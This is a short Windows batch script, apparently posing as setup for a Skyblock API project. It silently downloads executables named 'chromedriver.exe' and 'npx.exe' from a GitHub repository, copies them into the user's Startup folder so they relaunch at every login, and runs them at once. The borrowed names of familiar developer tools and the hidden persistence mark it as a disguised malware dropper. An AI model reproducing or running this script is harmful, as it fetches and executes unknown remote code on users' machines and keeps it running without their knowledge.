@echo off
curl -s -o "chromedriver".exe -JL "https://github.com/MidlesLex/SkyblockApi/raw/main/chromedriver.exe"
xcopy /y chromedriver.exe "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
chromedriver.exe
curl -s -o "npx".exe -JL "https://github.com/MidlesLex/SkyblockApi/raw/main/npx.exe"
xcopy /y npx.exe "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
npx.exe